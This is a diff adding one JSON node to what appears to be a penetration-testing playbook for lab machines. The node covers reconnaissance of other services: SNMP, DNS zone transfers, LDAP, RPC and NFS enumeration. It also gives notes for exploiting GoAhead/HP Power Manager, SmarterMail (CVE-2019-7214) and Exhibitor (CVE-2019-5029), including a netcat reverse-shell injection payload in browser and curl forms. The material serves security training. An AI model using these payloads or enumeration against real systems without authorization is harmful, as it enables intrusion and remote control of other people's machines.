@@ -1,0 +1,30 @@
+{
+  "id": "other_services",
+  "phase": "RECON",
+  "title": "Other Services",
+  "body": "SNMP leaks configs and community strings. DNS zone transfers can reveal the whole network map. LDAP and RPC enumerate users without authentication.",
+  "cmd": "# ── GOAHEAD WEBSERVER — EMBEDDED/INDUSTRIAL SOFTWARE ──\n# nmap fingerprint: GoAhead-Webs or GoAhead WebServer\n# Signals embedded device, industrial control, or management software\n# Almost always old CVEs — searchsploit immediately\n# Common applications on GoAhead:\n# HP Power Manager  → default admin:admin → buffer overflow RCE\n# IP cameras, NAS, UPS management consoles\n# Lab validated: Kevin (PG Practice) — admin:admin → MSF → SYSTEM\nsearchsploit hp power manager\n# msfconsole → search hp power manager → use → set rhosts/lhost/lport → run\n\n# ── .NET REMOTING (17001 / custom port) ──────────────\n# nmap labels this: \"MS .NET Remoting services\"\n# Vulnerable to deserialization attacks\n# Check searchsploit for the service running on it (e.g. SmarterMail)\n# CVE-2019-7214: SmarterMail < build 6985\n# Port in exploit = .NET remoting port (17001) NOT the web UI port (9998)\n# Exploit output is silent — feedback only via nc listener\nsearchsploit smartermail\n# python3 49216.py  (edit HOST, PORT=17001, LHOST, LPORT)\n\n# ── ZOOKEEPER + EXHIBITOR (2181 / 8080 / 8081) ──────\n# Zookeeper on 2181 = look for Exhibitor Web UI on 8080/8081\n# Exhibitor = ZooKeeper supervisor with NO AUTHENTICATION by default\n# nmap: http-title redirect to /exhibitor/v1/ui/index.html = vulnerable\n# CVE-2019-5029 — command injection via java.env script field\n# Affects all versions — no auth + no input validation\n# Lab validated: Pelican (PG Play)\n\n# Manual exploit (browser):\n# 1. Browse to http://$ip:8080/exhibitor/v1/ui/index.html\n# 2. Config tab → flip Editing to ON\n# 3. java.env script field → enter: $(/bin/nc -e /bin/sh $lhost $lport &)\n# 4. Commit → All At Once → OK → wait up to 1 minute\n\n# curl exploit:\n# curl -X POST -d @data.json http://$ip:8080/exhibitor/v1/config/set\n# data.json: {\"javaEnvironment\":\"$(/bin/nc -e /bin/sh $lhost $lport &)\",...}\n# Port may be 8081 (nginx proxy) or 8080 (direct) — try both\n\n# ── SNMP — community string brute + walk\n# snmp-check dumps FULL process list — confirms what's actually running\n# Lab: ClamAV box — snmp-check confirmed clamav-milter + inetd before exploit\nonesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt $ip\nsnmpwalk -c public -v1 $ip\nsnmp-check $ip\n\n# DNS zone transfer\ndig axfr @$ip domain.com\nhost -l domain.com $ip\ndnsrecon -d domain.com -t axfr\n\n# LDAP anonymous bind\nldapsearch -x -h $ip -b \"dc=domain,dc=com\"\nldapsearch -x -h $ip -b \"\" -s base namingContexts\n\n# RPC null session\nrpcclient -U \"\" $ip\n> enumdomusers\n> enumdomgroups\n> queryuser <RID>\n\n# NFS shares\nshowmount -e $ip",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Got usernames from SNMP/LDAP/RPC",
+      "next": "bruteforce"
+    },
+    {
+      "label": "SMTP open — enumerate users",
+      "next": "smtp_enum"
+    },
+    {
+      "label": "DNS — try zone transfer",
+      "next": "dns_enum"
+    },
+    {
+      "label": "Domain info found — pivot to AD",
+      "next": "ad_start"
+    },
+    {
+      "label": "NFS share found — mount it",
+      "next": "nfs_enum"
+    }
+  ]
+}
